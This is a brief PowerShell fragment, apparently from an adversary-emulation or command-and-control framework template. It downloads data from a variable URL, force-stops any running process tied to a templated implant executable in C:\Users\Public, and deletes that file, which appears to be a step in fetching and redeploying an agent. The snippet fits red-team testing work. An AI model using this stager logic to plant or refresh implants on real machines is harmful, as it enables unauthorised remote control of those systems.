              $data=$wc.DownloadData($url);
              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
